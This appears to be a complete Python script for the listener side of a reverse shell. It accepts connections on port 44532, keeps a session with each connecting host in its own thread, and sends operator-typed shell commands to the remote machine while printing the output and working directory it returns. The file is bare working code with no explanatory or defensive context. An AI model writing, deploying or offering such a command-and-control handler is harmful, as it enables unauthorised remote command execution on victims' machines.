import socket
import threading

HOST = "0.0.0.0"
PORT = 44532
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

def handle_client(client_socket, client_address):
    cwd = client_socket.recv(BUFFER_SIZE).decode()
    print(f"{client_address[0]}:{client_address[1]} Connected!")
    print(f"[+] Current working directory: ", cwd)

    shell_name = f"{client_address[0]}:{client_address[1]}"
    while True:
        command = input(f"{shell_name}@{cwd} $> ")
        if not command.strip():
            continue
        client_socket.send(command.encode())
        if command == "exit":
            return
        output = client_socket.recv(BUFFER_SIZE).decode()
        result, cwd = output.split(SEPARATOR)
        print(result)

def run_server():
    s = socket.socket()
    s.bind((HOST, PORT))
    s.listen(5)
    print(f"Listening as {HOST}:{PORT}...")
    while True:
        client_socket, client_address = s.accept()
        client_handler = threading.Thread(target=handle_client, args=(client_socket, client_address,))
        client_handler.start()

if __name__ == "__main__":
    run_server()